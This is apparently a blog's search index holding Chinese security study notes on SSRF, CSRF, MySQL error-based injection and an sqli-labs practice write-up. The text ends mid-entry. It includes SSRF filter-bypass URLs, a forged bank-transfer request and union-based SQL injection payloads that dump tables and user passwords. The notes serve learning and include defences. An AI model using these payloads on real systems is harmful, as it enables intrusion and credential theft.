<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SSRF漏洞的基础知识</title>
      <link href="/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/21/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>SSRF漏洞的一些基础知识的整理</p><a id="more"></a><h1 id="SSRF-漏洞的基础知识"><a href="#SSRF-漏洞的基础知识" class="headerlink" title="- SSRF 漏洞的基础知识"></a>- SSRF 漏洞的基础知识</h1><p>参考文章：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==" title="https://xz.aliyun.com/t/2115">https://xz.aliyun.com/t/2115<i class="fa fa-external-link"></i></span>    </p><h2 id="定义和成因"><a href="#定义和成因" class="headerlink" title="- 定义和成因"></a>- 定义和成因</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><h2 id="危害"><a href="#危害" class="headerlink" title="- 危害"></a>- 危害</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>对内网Web应用进行指纹识别，通过访问默认文件实现;</li><li>攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</li><li>利用File协议读取本地文件。</li></ol><h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="- 可能出现的地方"></a>- 可能出现的地方</h2><ol><li><p>社交分享功能：获取超链接的标题等内容进行显示</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译：给网址翻译对应网页的内容</p></li><li><p>图片加载/下载：点击下载图片到本地；通过URL地址加载或下载图片</p></li><li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p></li><li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p></li><li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="- 漏洞验证"></a>- 漏洞验证</h2><ol><li><p>排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL2EucGhwP2ltYWdlPe+8iOWcsOWdgO+8ieeahOWwseWPr+iDveWtmOWcqFNTUkbmvI/mtJ4=" title="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞<i class="fa fa-external-link"></i></span></p></li><li><p>dnslog等工具进行测试，看是否被访问</p></li><li><p>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p></li><li><p>直接返回的Banner、title、content等信息</p></li><li><p>留意bool型SSRF</p></li></ol><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="- 利用方式"></a>- 利用方式</h2><ol><li>让服务端去访问相应的网址</li><li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li><li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>判断内网主机是否存活：方法是访问看是否有端口开放</li><li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li></ol><h2 id="绕过小技巧"><a href="#绕过小技巧" class="headerlink" title="- 绕过小技巧"></a>- 绕过小技巧</h2><ol><li><p><span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbUB3d3cuYmFpZHUuY29tLw==" title="http://baidu.com@www.baidu.com/">http://baidu.com@www.baidu.com/<i class="fa fa-external-link"></i></span> 与 <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20v" title="http://www.baidu.com/">http://www.baidu.com/<i class="fa fa-external-link"></i></span> 请求时是相同的</p></li><li><p>各种IP地址的进制转换</p></li><li><p>URL跳转绕过：<span class="exturl" data-url="aHR0cDovL3d3dy5oYWNrZXJzYi5jbi9yZWRpcmVjdC5waHA/dXJsPWh0dHA6Ly8xOTIuMTY4LjAuMS8=" title="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/<i class="fa fa-external-link"></i></span></p></li><li><p>短网址绕过 <span class="exturl" data-url="aHR0cDovL3QuY24vUndiTEtEeA==" title="http://t.cn/RwbLKDx">http://t.cn/RwbLKDx<i class="fa fa-external-link"></i></span></p></li><li><p>xip.io来绕过：<span class="exturl" data-url="aHR0cDovL3h4eC4xOTIuMTY4LjAuMS54aXAuaW8v" title="http://xxx.192.168.0.1.xip.io/">http://xxx.192.168.0.1.xip.io/<i class="fa fa-external-link"></i></span> == 192.168.0.1 (xxx 任意）指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)</p></li><li><p>限制了子网段，可以加 :80 端口绕过。<span class="exturl" data-url="aHR0cDovL3RpZWJhLmJhaWR1LmNvbS9mL2NvbW1pdC9zaGFyZS9vcGVuU2hhcmVBcGk/dXJsPWh0dHA6Ly8xMC40Mi43Ljc4Ojgw" title="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80<i class="fa fa-external-link"></i></span></p></li><li><p>探测内网域名，或者将自己的域名解析到内网ip</p></li><li><p>例如 <span class="exturl" data-url="aHR0cDovLzEwLjE1My4xMzguODEvdHMucGhw" title="http://10.153.138.81/ts.php">http://10.153.138.81/ts.php<i class="fa fa-external-link"></i></span> , 修复时容易出现的获取host时以/分割来确定host，</p><p>但这样可以用 <span class="exturl" data-url="aHR0cDovL2FiY0AxMC4xNTMuMTM4LjgxLw==" title="http://abc@10.153.138.81/">http://abc@10.153.138.81/<i class="fa fa-external-link"></i></span> 绕过</p></li></ol><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="- 漏洞修复"></a>- 漏洞修复</h2><ol><li>禁止跳转</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</li><li>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全漏洞 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF攻击与防御</title>
      <link href="/2020/03/21/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2020/03/21/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<p>常见网络安全漏洞之一的CSRF漏洞，做下笔记。</p><a id="more"></a><h1 id="CSRF攻击与防御"><a href="#CSRF攻击与防御" class="headerlink" title="- CSRF攻击与防御"></a>- CSRF攻击与防御</h1><p>本文转载自： <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW94aW5zaHVhaWdhL2FydGljbGUvZGV0YWlscy84MDc2NjM2OQ==" title="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369">https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369<i class="fa fa-external-link"></i></span>  侵删</p><h2 id="CSRF-概念"><a href="#CSRF-概念" class="headerlink" title="- CSRF 概念"></a>- CSRF 概念</h2><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>       攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p><h2 id="CSRF-攻击原理及过程"><a href="#CSRF-攻击原理及过程" class="headerlink" title="- CSRF 攻击原理及过程"></a>- CSRF 攻击原理及过程</h2><p>其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p><ul><li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li><li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li><li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li><li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li><li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li></ul><p>CSRF攻击实例：</p><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <span class="exturl" data-url="aHR0cDovL2JhbmsuZXhhbXBsZS93aXRoZHJhdz9hY2NvdW50PWJvYiZhbXA7YW1vdW50PTEwMDAwMDAmYW1wO2Zvcj1ib2Iy" title="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2<i class="fa fa-external-link"></i></span> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p><p>黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<span class="exturl" data-url="aHR0cDovL2JhbmsuZXhhbXBsZS93aXRoZHJhdz9hY2NvdW50PWJvYiZhbXA7YW1vdW50PTEwMDAwMDAmYW1wO2Zvcj1NYWxsb3J544CC5L2G5piv6L+Z5Liq6K+35rGC5p2l6Ieq" title="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自<i class="fa fa-external-link"></i></span> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p><p>这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<span class="exturl" data-url="aHR0cDovL2JhbmsuZXhhbXBsZS93aXRoZHJhdz9hY2NvdW50PWJvYiZhbXA7YW1vdW50PTEwMDAwMDAmYW1wO2Zvcj1NYWxsb3J5" title="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory<i class="fa fa-external-link"></i></span> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p><h2 id="CSRF-漏洞检测"><a href="#CSRF-漏洞检测" class="headerlink" title="- CSRF 漏洞检测"></a>- CSRF 漏洞检测</h2><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。<br>       随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。<br>       以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h2 id="CSRF-攻击防御"><a href="#CSRF-攻击防御" class="headerlink" title="- CSRF 攻击防御"></a>- CSRF 攻击防御</h2><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p><ol><li><p>验证 HTTP Referer 字段：</p><p>​        根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <span class="exturl" data-url="aHR0cDovL2JhbmsuZXhhbXBsZS93aXRoZHJhdz9hY2NvdW50PWJvYiZhbXA7YW1vdW50PTEwMDAwMDAmYW1wO2Zvcj1NYWxsb3J577yM55So5oi35b+F6aG75YWI55m76ZmG" title="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆<i class="fa fa-external-link"></i></span> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p><p>​       这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>​        然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p><p>​       即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p></li><li><p>在请求地址中添加 token 并验证：</p><p>​       CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><p>​       这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <span class="exturl" data-url="aHR0cDovL3VybD9jc3JmdG9rZW49dG9rZW52YWx1ZeOAgg==" title="http://url?csrftoken=tokenvalue。">http://url?csrftoken=tokenvalue。<i class="fa fa-external-link"></i></span> 而对于 POST 请求来说，要在 form 的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p>​       该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p></li><li><p>在 HTTP 头中自定义属性并验证：</p><p>​       这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p>​       然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> web安全漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql报错注入</title>
      <link href="/2020/03/17/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/17/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>练习sql注入时，get新技能sql报错注入，做下笔记。</p><a id="more"></a><h2 id="报错注入：extractvalue、updatexml报错原理"><a href="#报错注入：extractvalue、updatexml报错原理" class="headerlink" title="- 报错注入：extractvalue、updatexml报错原理"></a>- 报错注入：extractvalue、updatexml报错原理</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue()</code></a></td><td>使用XPath表示法从XML字符串中提取值</td></tr><tr><td><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml" target="_blank" rel="noopener"><code>UpdateXML()</code></a></td><td>返回替换的XML片段</td></tr></tbody></table><p>通过这两个函数可以完成报错注入</p><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="- extractvalue函数"></a>- extractvalue函数</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue(xml_frag, xpath_expr)</code></a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue()</code></a>接受两个字符串参数，一个XML标记片段 <code>xml_frag</code>和一个XPath表达式 <code>xpath_expr</code>（也称为 定位器）; 它返回<code>CDATA</code>第一个文本节点的text()，该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><p>例如：<code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。<br><img src="1.png" alt="1"></p><p>（这里我们是为了学习报错注入，所以不需要太详细的知道该函数具体原理）</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。<br><img src="2.png" alt="2"></p><h3 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="- updatexml函数"></a>- updatexml函数</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml" target="_blank" rel="noopener"><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></a></p><p><code>xml_target</code>：需要操作的xml片段</p><p><code>xpath_expr</code>： 需要更新的xml路径(Xpath格式)</p><p><code>new_xml</code>： 更新后的内容</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <code>xml_target</code>新的XML片段 <code>new_xml</code>，然后返回更改的XML。<code>xml_target</code>替换的部分与<code>xpath_expr</code>用户提供的XPath表达式匹配。</p><p>如果<code>xpath_expr</code>没有找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <code>xml_target</code>XML片段。所有三个参数都应该是字符串。使用方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT</span><br><span class="line">    -&gt;   UpdateXML(&#39;&lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#39;, &#39;&lt;e&gt;fff&lt;&#x2F;e&gt;&#39;) AS val1,</span><br><span class="line">    -&gt;   UpdateXML(&#39;&lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;b&#39;, &#39;&lt;e&gt;fff&lt;&#x2F;e&gt;&#39;) AS val2,</span><br><span class="line">    -&gt;   UpdateXML(&#39;&lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;&#x2F;b&#39;, &#39;&lt;e&gt;fff&lt;&#x2F;e&gt;&#39;) AS val3,</span><br><span class="line">    -&gt;   UpdateXML(&#39;&lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#x2F;d&#39;, &#39;&lt;e&gt;fff&lt;&#x2F;e&gt;&#39;) AS val4,</span><br><span class="line">    -&gt;   UpdateXML(&#39;&lt;a&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#x2F;d&#39;, &#39;&lt;e&gt;fff&lt;&#x2F;e&gt;&#39;) AS val5</span><br><span class="line">    -&gt; \G</span><br><span class="line">***********结果**************</span><br><span class="line">val1: &lt;e&gt;fff&lt;&#x2F;e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;&#x2F;e&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;e&gt;fff&lt;&#x2F;e&gt;&lt;&#x2F;a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;b&gt;ccc&lt;&#x2F;b&gt;&lt;d&gt;&lt;&#x2F;d&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：<br><img src="3.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场</title>
      <link href="/2020/03/16/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/03/16/sqli-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>sqli-labs是一个专门练习sql注入的靶场，本文是我做sql注入练习的记录（未完，持续更新）</p><a id="more"></a><h2 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="- Basic Challenges"></a>- Basic Challenges</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="- Less-1"></a>- Less-1</h3><p>第一关是有error报错的，所以我们要先试出sql查询语句的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; &#x2F;&#x2F;添加&#39;引号报错</span><br></pre></td></tr></table></figure><p>通过报错语句，我们可以知道参数ID是放到一对单引号之间的。</p><p><img src="1.png" alt="1"></p><p>知道格式之后就是使用order by 确认可显示字段数了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; order by 3 %23</span><br><span class="line">&#x2F;&#x2F;%23是#的url编码，可以注释后面的sql查询语句</span><br></pre></td></tr></table></figure><p>3是试出来的，一般可以从5开始试，能正常显示就增加，不能就减少</p><p><img src="2.png" alt="2"></p><p>接着看哪些字段可以用来输出我们想要的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;&#39; union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>显示了2和3，所以2,3字段可以用来注入。</p><p><img src="3.png" alt="3"></p><p>因为没有什么过滤，下面就直接一把梭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&quot;users&quot; %23  &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;&#39; union select 1,group_concat(username),group_concat(password) from users %23 &#x2F;&#x2F;获取用户名和密码信息</span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="- Less-2"></a>- Less-2</h3><p>第二关在ID参数后面加<code>&#39;</code>，通过报错可以看出本关是数字型注入。</p><p><img src="5.png" alt="5"></p><p>而且本关依旧没有过滤，所以依旧是一把梭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 